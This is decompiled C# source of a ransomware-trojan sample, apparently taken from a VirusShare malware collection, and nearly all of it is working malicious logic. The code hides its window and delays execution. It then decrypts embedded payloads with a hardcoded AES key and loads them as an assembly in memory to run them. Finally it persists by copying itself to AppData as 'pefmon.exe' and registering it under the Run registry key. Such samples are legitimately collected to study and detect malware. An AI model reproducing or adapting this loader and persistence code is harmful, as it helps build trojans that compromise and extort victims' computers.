// Decompiled with JetBrains decompiler
// Type: frmOne
// Assembly: server2, Version=7.0.250.17, Culture=neutral, PublicKeyToken=null
// MVID: 19EB28BC-41E9-4068-ADDA-D4BBD42F75D0
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.cano-92e35ff64126d0cafe28b07fe628536637760ad350e7132bd2fa3321e76d6e48.exe

using Microsoft.Win32;
using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class frmOne : Form
{
  private void InitializeComponent()
  {
    this.SuspendLayout();
    this.FormBorderStyle = FormBorderStyle.None;
    this.ShowInTaskbar = false;
    this.ResumeLayout(false);
    this.Visible = false;
    this.WindowState = FormWindowState.Minimized;
  }

  public frmOne()
  {
    this.InitializeComponent();
    Thread.Sleep(12000);
    bool flag = true;
    byte[] input1 = Reader.ReadManaged();
    byte[] input2 = Reader.ReadManaged2();
    byte[] files = frmOne.AESDecrypt(input1, "KGuPFvKUDDpcDZmBi");
    foreach (System.Type type in Assembly.Load(frmOne.AESDecrypt(input2, "KGuPFvKUDDpcDZmBi")).GetTypes())
    {
      if (type.IsClass && type.FullName.EndsWith(".Class1"))
      {
        object instance = Activator.CreateInstance(type);
        Runner.RunStuff(type, instance, files);
      }
    }
    if (!flag)
      return;
    this.AddToStartup();
  }

  public static byte[] AESDecrypt(byte[] input, string Pass)
  {
    RijndaelManaged rijndaelManaged = new RijndaelManaged();
    byte[] destinationArray = new byte[32];
    byte[] hash = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(Pass));
    Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 16);
    Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 16);
    rijndaelManaged.Key = destinationArray;
    rijndaelManaged.Mode = CipherMode.ECB;
    return rijndaelManaged.CreateDecryptor().TransformFinalBlock(input, 0, input.Length);
  }

  public void AddToStartup()
  {
    if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\pefmon.exe"))
      return;
    File.Copy(Assembly.GetExecutingAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\pefmon.exe");
    RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
    if (registryKey.GetValue("pefmon") == null)
      registryKey.SetValue("pefmon", (object) (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\pefmon.exe"));
    registryKey.Close();
  }
}
